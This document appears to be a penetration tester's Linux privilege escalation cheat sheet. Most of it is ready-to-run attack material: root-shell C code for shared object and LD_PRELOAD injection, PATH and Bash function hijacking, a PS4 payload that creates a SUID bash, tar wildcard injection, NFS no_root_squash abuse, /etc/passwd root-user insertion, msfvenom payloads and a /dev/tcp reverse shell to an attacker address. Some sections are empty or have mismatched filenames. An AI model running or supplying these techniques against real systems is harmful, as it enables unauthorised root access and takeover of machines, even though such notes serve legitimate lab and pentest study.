- [Enumeration](#Enumeration)

- [Kernel Exploit](#Kernel-Exploit)

- [PATH Variable](#PATH_Variable)
    
- [SUID and SGID](#SUID-and-SGID)
    
- [Cronjob](#Cronjobs)
    
- [Sudo](#Sudo)
    
- [NFS](#NFS)
    
- [Weak files permissions](#Weak-files-permission)

- [Services exploits](#Services-exploits)

- [Password](#Password)

- [Wildcards](#Wildcards)  

- [Python library hijacking](#Python-library-hijacking)

- [lxd or lxc group](#lxd-or-lxc-group)
  
- [Using Capabilities](#Using-capabilities)

- [Unmounted Disks](#Unmounted Disks)

- [Tools](#Tools)

--------------------------------------------------------------------------------------------------------------------------------

# Enumeration

--------------------------------------------------------------------------------------------------------------------------------

# Kernel-Exploit

### Use linux-exploit-suggester.sh
```
linux-exploit-suggester.sh
```

--------------------------------------------------------------------------------------------------------------------------------

# PATH Variable

##### Check the PATH
```
echo $PATH
```

#### Finding vulnerability in programs

- Running strings:
```
strings /path/to/file
```

- Running strace:
```
strace -v -f -e execve <command> 2>&1 | grep exec
```

- Running ltrace:
```
ltrace <command>
```

#### Path variable real word case study 

- Find SUID/SGID files on the target:
```
find / -type f -a \( -perm -u+s -o -perm -g+s \) -exec ls -l {} \; 2> /dev/null
  [...ouput...]
  -rwsr-sr-x 1 root staff 6883 May 14 2017 /usr/local/bin/suid-env
```

- Run strings on the SUID file:
```
strings /usr/local/bin/suid-env
  [...output...]
  /lib64/ld-linux-x86-64.so.2

The file could be trying to run the service program without a full path.
```

- We can verify this with strace:
```
strace -v -f -e execve /usr/local/bin/suid-env 2>&1 | grep service
  [pid 14395] execve("/bin/sh", ["sh", "-c", "service apache2 start"],
```

- Optionally, we can also verify with ltrace:
```
ltrace /usr/local/bin/suid-env 2>&1 | grep service
  system("service apache2 start")

This reveals that the system function is being used to execute the service program.
```

- Create a file system.c with the following contents:
```
  int main() {
    setuid(0);
    system("/bin/bash -p");
  }
  
Compile service.c into a file called service
```

- Prepend the current directory (or where the new service executable is located) to the PATH variable, and execute the SUID file for a root shell)
```
  PATH=.:$PATH /usr/local/bin/suid-env
```

### Path variable case study two 
- Find SUID/SGID files on the target:
```
  find / -type f -a \( -perm -u+s -o -perm -g+s \) -exec ls -l {} \; 2> /dev/null
  -rwsr-sr-x 1 root staff 6899 May 14 2017 /usr/local/bin/suid-env2
```

- Run strings on the SUID file:
```
  strings /usr/local/bin/suid-env2
   /usr/sbin/service apache2 start
```

- Verify the version of Bash is lower than 4.2-048:
```
  bash --version
  GNU bash, version 4.1.5(1)-release (x86_64-pc-linux-gnu)
```

- Create a Bash function with the name "/usr/sbin/service" and export the function:
```
  function /usr/sbin/service { /bin/bash -p; }
  export –f /usr/sbin/service
```

- Execute the SUID file for a root shell:

### Path variable case study three
Bash debugging mode. When in debugging mode, Bash uses the environment variable PS4 to display an extra prompt for debug statements. This variable can include an embedded command, which will execute every time it is shown.

If a SUID file runs another program via Bash (e.g. by using system() ) these environment variables can be inherited.
If an SUID file is being executed, this command will execute with the privileges of the file owner. In Bash versions 4.4 and above, the PS4 environment variable is not inherited by shells running as root.

Find SUID/SGID files on the target:
```
  find / -type f -a \( -perm -u+s -o -perm -g+s \) -exec ls -l {} \; 2> /dev/null -rwsr-sr-x 1 root staff 6899 May 14 2017 /usr/local/bin/suid-env2
```
Run strings on the SUID file:
```
  strings /usr/local/bin/suid-env2
  /usr/sbin/service apache2 start
```
Run the SUID file with bash debugging enabled and the PS4 variable assigned to our payload
```
  env -i SHELLOPTS=xtrace PS4='$(cp /bin/bash /tmp/rootbash; chown root /tmp/rootbash; chmod +s /tmp/rootbash)' /usr/local/bin/suid-env2
```
Run the /tmp/rootbash file with the -p
```
  /tmp/rootbash -p
```
--------------------------------------------------------------------------------------------------------------------------------
# SUID and SGID

- SUID: executed with the privileges of the file owner
- SGID: executed with the privileges of the file group

## Search for SUID and SGID file
- find / -perm -1000 -type d 2>/dev/null
- find / -type f -perm -04000 -ls 2>/dev/null
- find / -perm -u=s -type f 2>/dev/null
- find / -perm -g=s -type f 2>/dev/null
- find / -type f -a \( -perm -u+s -o -perm -g+s \) -exec ls -l {} ; 2> /dev/null
- find / -perm -4000 -type f 2>/dev/null
- find / -user root -type f -perm -4000  -ls 2>/dev/null
- find / -uid 0 -perm -4000 -type f 2>/dev/null
- find / -type f -perm -g+s -exec ls -ald {} \; 2>/dev/null
- find / -user root -perm -002 -type f -not -path "/" 2>/dev/null
- find / -writable -type f 2>/dev/null>

## Strace for track suid file execute
```
  strace /suid/file/path 2>&1 | grep -iE "open|access|no such file"
  strace -v -f -e execve /suid/file/path 2>&1 | grep service
```

## Shared Object Injection
When a program is executed, it will try to load the shared objects it requires.
By using a program called strace, we can track these system calls and determine whether any shared objects were not found.
If we can write to the location the program tries to open, we can create a shared object and spawn a root shell when it is loaded.

- Check strace
```
strace /suid/path/and/name/suid_name 2>&1 | grep -i -E "open|access|no such file"
```
- From the output, notice that a .so file is missing from a writable directory.
- Create malicious file
```
include <stdio.h>
#include <stdlib.h>

static void inject() __attribute__((constructor));

void inject() {
    system("cp /bin/bash /tmp/bash && chmod +s /tmp/bash && /tmp/bash -p");
}
```
- compile so file
```
gcc -shared -o /your/destination/for/malicious/file.so -fPIC /your/path/to/malicious/file.c
```
- Execute so file
for example
```
/usr/local/bin/suid-so
```

#### Shared Object case study one
- Find SUID/SGID files on the target:
```
  find / -type f -a \( -perm -u+s -o -perm -g+s \) -exec ls -l {} \; 2> /dev/null
  found one file: suid-so
```
The suid-so file should execute with root user permissions.

- Run strace on the SUID file:
```
  strace /usr/local/bin/suid-so 2>&1 | grep -iE "open|access|no such file"
  access("/etc/suid-debug", F_OK) = -1 ENOENT (No such file or directory)

  open("/home/user/.config/libcalc.so", O_RDONLY) = -1 ENOENT (No such file or directory)
```
The libcalc.so shared object could not be found, and the program is looking in our user’s home directory, which we can write to

- Create the /home/user/.config directory.

- Create the file libcalc.c with the following contents:
```
  #include <stdio.h>
  #include <stdlib.h>

  static void inject() __attribute__((constructor));
    void inject() {
      setuid(0);
      system("/bin/bash -p");
  }
```
- Compile libcalc.c into /home/user/.config/libcalc.so:
```
  gcc -shared -fPIC -o /home/user/.config/libcalc.so libcalc.c
```
- Run the SUID executable to get a root shell

#### ltrace Case study two
- find SUID binary
```
find / -user root -type f -perm -4000  -ls 2>/dev/null
```
- run ltrace
```
we got popen("fdisk -l", "r") 

popen is another way to open a process on Linux. 
```
- Create reverseshell in /tmp
```
xyz@ubuntu:/dev/shm$ echo -e '#!/bin/bash\n\nbash -i >& /dev/tcp/10.10.14.xx/443 0>&1' > fdisk
```
- Update path
```
export PATH="/tmp:$PATH"
```
- run sysinfo

## Create c file
- Example one
```
int main()
{
  setuid(0);
  system("/bin/bash -p");
}
```
- Example two
```
int main()
{
  setuid(0);
  setgid(0);
  execl("/bin/sh", "sh", 0)
}
```
gcc -o [name] [filename.c]

SUID/SGID - Environment Variables
- Run file with current folder in path
```
PATH=.:$PATH /usr/local/bin/suid-env
```
### Abusing Shell Features case study three

- Find SUID
```
find / -type f -perm -04000 -ls 2>/dev/nul
```

- check srtings(search for running services)
```
strings /usr/local/bin/suid-env2
```

In Bash versions <4.2-048 it is possible to define shell functions with names that resemble file paths, then export those functions so that they are used instead of any actual executable at that file path.
- check bash version
```
/bin/bash --version
```

Create a Bash function with the name "/usr/sbin/service" (service name is, a example name) that executes a new Bash shell 
```
function /usr/sbin/service { /bin/bash -p; }
export -f /usr/sbin/service
```
Run SUID
```
usr/local/bin/suid-env2
(suid-env2) example name
```

### Abusing Shell Features case study four
- This will not work on Bash versions 4.4 and above.
When in debugging mode, Bash uses the environment variable PS4 to display an extra prompt for debugging statements.
Run:
```
find / -perm -u=s -type f 2>/dev/null

```
for example the result is  /usr/local/bin/suid-env2 executable with bash debugging enabled and the PS4 variable set to an embedded command which creates an SUID version of /bin/bash:
```
env -i SHELLOPTS=xtrace PS4='$(cp /bin/bash /tmp/rootbash; chmod +xs /tmp/rootbash)' /usr/local/bin/suid-env2
```

- Run the /tmp/rootbash executable with -p to gain a shell running with root privileges:
```
/tmp/rootbash -p
```

--------------------------------------------------------------------------------------------------------------------------------
# Cronjobs 

## Cronjob path

crontab *PATH* env variable is by default set to /usr/bin:/bin
The PATH variable can be overwritten in the crontab file
If the cron job progam/script does not use an absolute path and one of the PATH directories is wrtietable by our user, we my be able to crete a program/script with the same name as the cron job

### Cronjob case study one 

$ cat /etc/crontab
```
PATH=/home/user:/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/
usr/bin

* * * * * root overwrite.sh
* * * * * root /usr/local/bin/compress.sh
```
- The /home/user directory (which we can write to) is at the start of the PATH variable, and the first cron job does not use an absolute path

- Create the file overwrite.sh in /home/user with the following contents:
```
#!/bin/bash
cp /bin/bash /tmp/rootbash
chmod +s /tmp/rootbash

-Oneline
echo 'cp /bin/bash /tmp/rootbash; chmod +s /tmp/bash' > /home/user/overwrite.sh

run: /tmp/rootbash -p
```

- Ensure that overwrite.sh is executable:
```
$ chmod +x /home/user/overwrite.sh
```

## Cronjob wildcards
When a wildcard character (*) is provided to a command as part of an argument, the shell will first perform filename expansion (also known as globbing) on the wildcard. 

The following commands should show how this works:
```
$ ls *
% touch ./-l
$ ls *
```
output execute ls -la

### Cronjob case study two
$ cat /etc/crontab
```
* * * * * root /usr/local/bin/compress.sh
```
- View the contents of the /usr/local/bin/compress.sh file:
$ cat /usr/local/bin/compress.sh

```
#!/bin/sh
cd /home/user
tar czf /tmp/backup.tar.gz *
```
- Note that the tar command is run with a wildcard in the /home/user directory.

- GTFOBins shows that tar has command line options which can be used to run other commands as part of a checkpoint feature. 
- create malicious file
```
msfvenom -p linux/x64/shell_reverse_tcp LHOST=<IP> LPORT=53 -f elf -o shell.elf
or 
echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > runme.sh
```
- Copy the file to the /home/user directory on the remote host.

- Create two files in the /home/user directory:
```
$ touch /home/user/--checkpoint=1
$ touch /home/user/--checkpoint-action=exec=shell.elf
or 
$ touch /home/user/--checkpoint-action=exec=sh\ runme.sh
```
- Run a netcat listener
```
nc -lnvp 4444
```
## Cronjob file overwrite

- Check file permission
```
ls -la file
```
- Edit file 
```
echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' >> file
```
- Execute file
```
 /tmp/bash -p
```
------------------------------------------------------------------------------------------------------------------------------------------------------------------

# Sudo
Is a program which lets users run other program with the security privileges of the users.

## Useful commands
- Run program using sudo
  - sudo [program]
- Run porgram as specific user
  - sudo -u [username] [program]
- List programs a user allowed to run:
  - sudo -l

- Other way to privileges (su program is not allowed)
  - sudo -s
  - sudo -i 
  - sudo /bin/bash
  - sudo passwd

## Shell Escaping
- https://gtfobins.github.io/

## Abusing Intended Functionality
- Apache example
- sudo -l
- sudo apache2 -f /etc/shadow

## LD_PRELOAD
LD_PRELOAD is an environment variable which can be set to the path of a shared object (.so) file. When set, the shared object will be loaded before any others.By creating a custom shared object and creating an init() function, we can execute code as soon as the object is loaded.LD_PRELOAD will not work if the real user ID is different from the effective user ID. Sudo must be configured to preserve the LD_PRELOAD environment variable using the env_keep option

- c example
```
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
    unsetenv("LD_PRELOAD");
    setgid(0);
    setuid(0);
    system("/bin/bash");
}
```

- compliation
```
gcc -fPIC -shared -o /tmp/x.so x.c -nostartfiles
```

- execution
```
sudo LD_PRELOAD=/tmp/x.so apache2
```


### GTFObins case study one
- when apache parsing a given config file it will error and print any line it doesn't understand
```
sudo apache2 -f /etc/shadow
```

## Sudo Environment Variables
Programs run throuh sudo can inherit the environment variables from the users environment.
In the /etc/sudoers config file, if the env_reset option is set, sudo will run programs in a new, minimal environment.
The env_keep option can be used to keep certain environment variables from the user’s environment.
The configured options are displayed when running sudo -l

### Environment Variables case study one
LD_PRELOAD is an environment variable which can be set to the path of a shared object (.so) file. When set, the shared object will be loaded before any others.By creating a custom shared object and creating an init() function, we can execute code as soon as the object is loaded.LD_PRELOAD will not work if the real user ID is different from the effective user ID. Sudo must be configured to preserve the LD_PRELOAD environment variable using the env_keep option.
```
sudo -l
Matching Defaults entries for user on this host:
    env_reset, env_keep+=LD_PRELOAD, env_keep+=LD_LIBRARY_PATH
```
- env_keep option includes the LD_PRELOAD environment variable

- create file.c
```
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
  unsetenv("LD_PRELOAD");
  setresuid(0,0,0);
  system("/bin/bash -p");
}
```
- compile file

```
$ gcc -fPIC -shared -nostartfiles -o /tmp/file.so file.c
```
- run
```
sudo LD_PRELOAD=/tmp/preload.so apache2
```

### Environment Variables case study two

The LD_LIBRARY_PATH environment variable contains a set of directories where shared libraries are searched for first.
```
ldd /usr/sbin/apache2
```
By creating a shared library with the same name as one used by a program, and setting LD_LIBRARY_PATH to its parent directory, the program will load our shared library instead.

- Create a file (library_path.c)
```
#include <stdio.h>
#include <stdlib.h>

static void hijack() __attribute__((constructor));

void hijack() {
  unsetenv("LD_LIBRARY_PATH");
  setresuid(0,0,0);
  system("/bin/bash -p");
}
```
- Compile file
```
$ gcc -o libcrypt.so.1 -shared -fPIC library_path.c
```
- Run file
```
sudo LD_LIBRARY_PATH=. apache2
```
--------------------------------------------------------------------------------------------------------------------------------
# NFS
NFS (Network File System) is a popular distributed file system. NFS shares are configured in the /etc/exports file.
- type
```
cat /etc/exports
```
- important
```
"no_root_squash" option is defined for the export folder.
```

## NFS Commands

- Show the NFS server’s export list:
```
showmount -e [victim]
```
- Similar Nmap script:
```
nmap –sV –script=nfs-showmount [victim]
```
- Mount an NFS share:
```
mount -o rw,vers=2 [victim]:<share> <local_directory>
```

## Root squashing
Root Squashing is how NFS prevents an obvious privilege escalation. If the remote user is (or claims to be) root (uid=0), NFS will instead “squash” the user and treat them as if they are the “nobody” user, in the “nogroup” group. While this behavior is default, it can be disabled!

## No root squash
no_root_squash is an NFS configuration option which turns root squashing off.
When included in a writable share configuration, a remote user who identifies as “root” can create files on the NFS share as the local root user.

### NFS case study one
- Check the contents of /etc/exports for shares with the no_root_squash option:
```
cat /etc/exports
/tmp *(rw,sync,insecure,no_root_squash,no_subtree_check)
```
- Confirm that the NFS share is available for remote mounting:
```
showmount -e 192.168.1.25
Exports list on 192.168.1.25:
/tmp
```
- Create a mount point on your local machine and mount the /tmp NFS share:
```
mkdir /tmp/nfs
mount -o rw,vers=2 192.168.1.25:/tmp /tmp/nfs
```
- Using the root user on your local machine, generate a payload and save it to the mounted share:
```
msfvenom -p linux/x86/exec CMD="/bin/bash -p" -f elf -o /tmp/nfs/shell.elf
or 
echo 'int main() { setgid(0); setuid(0); system("/bin/bash"); return 0; }' > /tmp/1/x.c
and
gcc /tmp/1/x.c -o /tmp/1/x
```
- Make sure the file has the SUID bit set, and is executable by everyone:
```
chmod +xs /tmp/nfs/shell.elf
or 
chmod +s /tmp/1/x
```
- On the target machine, execute the file to get a root shell:
```
/tmp/shell.elf
or
/tmp/x
```
--------------------------------------------------------------------------------------------------------------------------------
# Weak files permission

### Find files readable and writeable files
- Find all writeable files
```
find /etc -maxdepth 1 -writable -type f
find / -xdev -type d ( -perm -0002 -a ! -perm -1000 ) -print 
find / -writable -type d 2>/dev/null
find / -writable -type f 2>/dev/null
find / -perm -222 -type d 2>/dev/null
find / -perm -o w -type d 2>/dev/null
find / ! -path "*/proc/*" -perm -2 -type f -print 2>/dev/null
```
- Find writable by current user
```
find / perm /u=w -user whoami 2>/dev/null
find / -perm /u+w,g+w -f -user whoami 2>/dev/null
find / -perm /u+w -user whoami 2>/dev/null
```
- Find writable folder
```
find / -perm -o x -type d 2>/dev/null
```
- Find writable and executable files
```
find / -perm -o w -perm -o x -type d 2>/dev/null
```
- Find all readable files (maxdepth 1)
```
find /etc -maxdepth 1 -readable -type f
find / -perm -2 ! -type l -ls 2>/dev/null
```
- Find all directories which can be written to:
```
find / -executable -writable -type d 2> /dev/null
```

#### Interesting files

- Crack sudo password hash
```
echo '$hash' > hash.txt'
john --format=sha512crypt --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
```

- /etc/passwd 
 For backwards compatibility, if the second field of a user row in /etc/passwd contains a password hash, it takes precedent over the hash in /etc/shadow. If we can write to /etc/passwd, we can easily enter a known password hash for
the root user, and then use the su command to switch to the root user. Alternatively, if we can only append to the file, we can create a new user but assign them the root user ID (0). This works because Linux allows multiple entries
for the same user ID, as long as the usernames are different.

- Structure:
```
root:x:0:0:root:/root:/bin/bash
```

The x in second filed instructs Linux to look for the password hash in /etc/shadow. In some versions of Linux, it is possible to simply delete the “x”, which Linux interprets as the user having no password/
```
root::0:0:root:/root:/bin/bash
```

- Check the permissions of the /etc/password file (look for world writeable)
```
ls -la /etc/passw
```

- Generate a password hash for the password via openssl
```
openssl passwd "password"
L9yLGxncbOROc

openssl passwd -1 -salt "your_salt" "new_password"
e.g (openssl passwd -1 -salt "new" "123")
```

- Edit /etc/passwd file and enter the hash in the second field of the root user row
```
root:L9yLGxncbOROc:0:0:root:/root:/bin/bash
```

- Log in as root

- Alternatively, append a new row to /etc/passwd
```
newroot:L9yLGxncbOROc:0:0:root:/root:/bin/bash
```

#### Backups files
- common places for searching
  - ls -la /home
  - ls -la /root
  - ls -la /tmp
  - ls -la /var/backups
  
 - confirm that root logins are even allowed via SSH
```
grep PermitRootLogin /etc/ssh/sshd_config
```
 -----------------------------------------------------------------------------------------------------------------------------------------------------------------
# Services exploits

### Check local available services
- netstat -anlp
- netstat -ano
- netstat -tulpn

### Check local running services
- ps aux | grep root
- ps -ef | grep root
- top
- cat /etc/services

### Check services configuration file
- cat /etc/syslog.conf
- cat /etc/chttp.conf
- cat /etc/lighttpd.conf
- cat /etc/cups/cupsd.conf
- cat /etc/inetd.conf
- cat /etc/apache2/apache2.conf
- cat /etc/my.conf
- cat /etc/httpd/conf/httpd.conf
- cat /opt/lampp/etc/httpd.conf
- ls -aRl /etc/ | awk '$1 ~ /^.*r.*/

------------------------------------------------------------------------------------------------------------------------------------------------------------------
# Password

## View the contents of hidden files in the users files
```
cat ~/.*history | less

cat .bash_history
```

## Search for password
```
grep -r 'passw' ./*
```

### Password case study one
- A hidden directory (.ssh) exists in the system root directory. View the contents of this directory:
```
ls -l /.ssh
-rw-r--r-- 1 root root 1679 Aug 19 06:56 root_key
```

- Copy the root_key file to your local machine and correct its permissions so SSH will accept it:
```
chmod 600 root_key
```

- Use the key to connect to the SSH server as the root user
```
ssh -i root_key root@192.168.1.25
```
------------------------------------------------------------------------------------------------------------------------------------------------------------------
# Wildcards

------------------------------------------------------------------------------------------------------------------------------------------------------------------
# Python library hijacking

## Write permissions on imported python module
- In this case we have redundant for some libraies
```
import os

..[some_code]..
```
- Check os.py permission
```
-rwxrwxrwx   1 root root  38995 Sep 25 05:36 os.py
```
- We can change some code in library

## Higher priority python library path with broken privileges
Python will search that module file through some predefined directories in a specific order of priority

- check oder
```
python2 -c 'import sys; print("\n".join(sys.path))'

python3 -c 'import sys; print("\n".join(sys.path))'
```
- The searched module will be located in one of the defined paths, but if Python finds a module with the same name in a folder with higher priority, it will import that module instead of the “legit” one.

- We can move out the original module or copy our module to higher priority folder if we have correct permissions

## Redirecting python library search through PYTHONPATH environment variable
PYTHONPATH environment variable indicates a directory, where Python can search for modules to import.

- Check python path sudo -l

# TO DO

# lxd or lxc group

## lxd usefull resources
- [https://book.hacktricks.xyz/linux-unix/privilege-escalation/interesting-groups-linux-pe/lxd-privilege-escalation](https://book.hacktricks.xyz/linux-unix/privilege-escalation/interesting-groups-linux-pe/lxd-privilege-escalation)
- [https://www.hackingarticles.in/lxd-privilege-escalation/](https://www.hackingarticles.in/lxd-privilege-escalation)

# Using capabilities
give any user running that executable the specific superuser privilege defined by the capability

- Check capabilities on the system
```
getcap -r / 2>/dev/null
```

example privesc with python3
```
getcap -r / 2>/dev/null

output:
/home/test/python3 = cap_setuid+ep

privesc:
./python3 -c 'import os;os.setuid(0); os.system("/bin/bash")'
```
------------------------------------------------------------------------------------------------------------------------------------------------------------------
# Unmounted Disks
- fstab
```
cat /etc/fstab
```
- mount
```
mount
```
- lsblk
```
/bin/lsblk
```
------------------------------------------------------------------------------------------------------------------------------------------------------------------
# Kernel modules
- lsmod
```
lsmod
```
- libata
```
/sbin/modinfo libata
```

------------------------------------------------------------------------------------------------------------------------------------------------------------------
# Tools

## Run usefull script for linux enumeration

### Linenum
- ***Linenum***: https://github.com/rebootuser/LinEnum

### Linuxprivchecker
- ***Linuxprivchecker***: https://github.com/sleventyeleven/linuxprivchecker/blob/master/linuxprivchecker.py

### LinuxExploitSuggester
- ***LinuxExploitSuggester***: https://github.com/mzet-/linux-exploit-suggester

### LinuxExploitSuggester2
- ***LinuxExploitSuggester2***: https://github.com/jondonas/linux-exploit-suggester-2

### LinuxPrivChecker
- ***LinuxPrivChecker***: https://github.com/sleventyeleven/linuxprivchecker/blob/master/linuxprivchecker.py

### LinuxSmartEnumeration
- ***LinuxSmartEnumeration***: https://github.com/diego-treitos/linux-smart-enumeration

### BeRoot
- ***BeRoot***: https://github.com/AlessandroZ/BeRoot
